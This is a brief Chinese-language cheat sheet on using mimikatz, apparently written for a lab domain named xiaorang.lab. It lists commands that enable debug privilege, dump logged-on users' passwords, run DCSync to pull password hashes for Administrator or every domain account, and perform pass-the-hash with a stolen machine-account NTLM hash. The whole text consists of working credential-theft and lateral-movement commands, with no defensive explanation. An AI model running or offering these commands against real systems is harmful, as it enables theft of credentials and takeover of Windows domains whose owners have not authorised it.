mimikatz的使用

提权

```bash
privilege::debug
```

抓取用户密码

```bash
sekurlsa::logonpasswords
```

Dcsync  dump哈希

```bash
lsadump::dcsync /domain:xiaorang.lab /user:Administrator
lsadump::dcsync /domain:xiaorang.lab /all /csv
```

哈希传递

```bash
sekurlsa::pth /user:WIN2016$ /domain:xiaorang.lab /ntlm:抓到的机器账户哈希
```

